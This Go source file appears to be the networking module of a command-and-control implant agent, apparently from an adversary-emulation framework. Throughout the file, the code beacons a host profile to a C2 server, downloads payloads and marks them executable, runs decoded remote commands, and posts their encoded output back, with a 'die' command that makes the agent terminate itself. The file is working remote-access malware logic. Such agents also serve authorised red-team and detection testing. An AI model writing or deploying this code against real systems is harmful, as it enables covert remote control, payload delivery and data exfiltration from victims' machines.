package api

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"time"

	"../execute"
	"../util"
)

// Instructions is a single call to the C2
func Instructions(profile map[string]interface{}) map[string]interface{} {
	data, _ := json.Marshal(profile)
	address := fmt.Sprintf("%s/sand/instructions", profile["server"])
	bites := request(address, data)
	var out map[string]interface{}
	if bites != nil {
		fmt.Println("[+] beacon: ALIVE")
		var commands interface{}
		json.Unmarshal(bites, &out)
		json.Unmarshal([]byte(out["instructions"].(string)), &commands)
		out["sleep"] = int(out["sleep"].(float64))
		out["instructions"] = commands
	} else {
		fmt.Println("[-] beacon: DEAD")
	}
	return out
}

// Drop the payload
func Drop(server string, payload string) {
	location := filepath.Join(payload)
	if len(payload) > 0 && util.Exists(location) == false {
		fmt.Println(fmt.Sprintf("[*] Downloading new payload: %s", payload))
		address := fmt.Sprintf("%s/file/download", server)
		req, _ := http.NewRequest("POST", address, nil)
		req.Header.Set("file", payload)
		req.Header.Set("platform", string(runtime.GOOS))
		client := &http.Client{}
		resp, err := client.Do(req)
		if err == nil {
			dst, _ := os.Create(location)
			defer dst.Close()
			_, _ = io.Copy(dst, resp.Body)
			os.Chmod(location, 0500)
		}
	}
}

// Execute executes a command and posts results
func Execute(profile map[string]interface{}, command map[string]interface{}) {
	cmd := string(util.Decode(command["command"].(string)))
	status := "0"
	result, err := execute.Execute(cmd, command["executor"].(string))
	if err != nil {
		status = "1"
	}
	address := fmt.Sprintf("%s/sand/results", profile["server"])
	link := fmt.Sprintf("%f", command["id"].(float64))
	data, _ := json.Marshal(map[string]string{"link_id": link, "output": string(util.Encode(result)), "status": status})
	request(address, data)
	if cmd == "die" {
		fmt.Println("[+] Shutting down...")
		util.StopProcess(os.Getpid())
	}
	time.Sleep(time.Duration(command["sleep"].(float64)) * time.Second)
}

func request(address string, data []byte) []byte {
	req, _ := http.NewRequest("POST", address, bytes.NewBuffer(util.Encode(data)))
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := ioutil.ReadAll(resp.Body)
	return util.Decode(string(body))
}
